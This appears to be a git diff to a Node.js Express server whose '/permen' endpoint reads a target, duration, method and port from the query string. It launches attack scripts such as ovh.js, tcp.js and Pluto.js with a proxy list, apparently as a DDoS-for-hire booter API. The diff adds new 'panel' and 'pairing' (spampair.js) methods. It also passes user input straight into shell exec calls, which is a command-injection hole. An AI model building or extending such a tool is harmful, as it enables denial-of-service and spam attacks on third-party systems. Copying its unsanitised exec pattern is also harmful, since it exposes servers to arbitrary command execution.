@@ -16,6 +16,7 @@ app.get('/permen', (req, res) => {
   const { target, time, methods, port } = req.query;
   const sikat = new url.URL(target);
   const slurp = sikat.hostname;
+  const path = sikat.pathname;
 
   res.status(200).json({
     message: 'API request received. Executing script shortly.',
@@ -27,7 +28,9 @@ app.get('/permen', (req, res) => {
   // Eksekusi sesuai methods
   if (methods === 'ninja') {
     console.log('received');
-    exec(`node ./methods/ninja ${target} ${time}`);
+    exec(`node methods/ninja ${target} ${time}`);
+  } else if (methods === 'panel') {
+    exec(`node methods/panel.js ${target} ${time}`);
   } else if (methods === 'pluto') {
     exec(`node methods/Pluto.js ${target} ${time} 65 4 proxy.txt`);
   } else if (methods === 'poseidon') {
@@ -86,6 +89,8 @@ app.get('/permen', (req, res) => {
     exec(`node methods/ovh.js ${slurp} ${port} ${time}`);
   } else if (methods === 'tcp2') {
     exec(`node methods/tcp.js ${slurp} ${port} ${time}`);
+  } else if (methods === 'pairing') {
+    exec(`node methods/spampair.js ${path} ${time}`);
   } else if (methods === 'refresh') {
     exec(`pm2 restart all && pkill node`);
   } else if (methods === 'proxy') {
